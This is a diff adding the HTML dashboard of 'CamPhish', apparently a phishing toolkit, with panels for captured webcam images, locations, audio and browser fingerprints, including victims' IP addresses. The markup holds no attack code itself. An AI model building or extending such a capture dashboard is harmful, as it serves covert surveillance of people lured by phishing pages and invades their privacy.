@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CamPhish Dashboard</title>
+    <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+    <header>
+        <h1>CamPhish Dashboard</h1>
+        <p class="author">Author: Rahul Kushwaha</p>
+    </header>
+
+    <main>
+        <section class="stats-container">
+            <div class="stat-card" id="images-card">
+                <div class="stat-icon">📷</div>
+                <div class="stat-value" id="images-count">0</div>
+                <div class="stat-label">Images</div>
+            </div>
+            <div class="stat-card" id="locations-card">
+                <div class="stat-icon">📍</div>
+                <div class="stat-value" id="locations-count">0</div>
+                <div class="stat-label">Locations</div>
+            </div>
+            <div class="stat-card" id="fingerprints-card">
+                <div class="stat-icon">🔐</div>
+                <div class="stat-value" id="fingerprints-count">0</div>
+                <div class="stat-label">Fingerprints</div>
+            </div>
+            <div class="stat-card" id="audio-card">
+                <div class="stat-icon">🎤</div>
+                <div class="stat-value" id="audio-count">0</div>
+                <div class="stat-label">Audio</div>
+            </div>
+        </section>
+
+        <section class="gallery-section">
+            <h2>Image Gallery</h2>
+            <div class="gallery" id="image-gallery">
+                <p class="no-data">No images captured yet</p>
+            </div>
+        </section>
+
+        <section class="locations-section">
+            <h2>Locations</h2>
+            <div class="locations-list" id="locations-list">
+                <p class="no-data">No locations captured yet</p>
+            </div>
+        </section>
+
+        <section class="fingerprints-section">
+            <h2>Fingerprints</h2>
+            <div class="table-container">
+                <table id="fingerprints-table">
+                    <thead>
+                        <tr>
+                            <th>Timestamp</th>
+                            <th>IP Address</th>
+                            <th>Browser</th>
+                            <th>Platform</th>
+                            <th>Screen</th>
+                        </tr>
+                    </thead>
+                    <tbody id="fingerprints-body">
+                        <tr>
+                            <td colspan="5" class="no-data">No fingerprints captured yet</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </section>
+    </main>
+
+    <footer>
+        <p>&copy; 2024 CamPhish Dashboard - Author: Rahul Kushwaha</p>
+    </footer>
+
+    <script src="js/dashboard.js"></script>
+</body>
+</html>
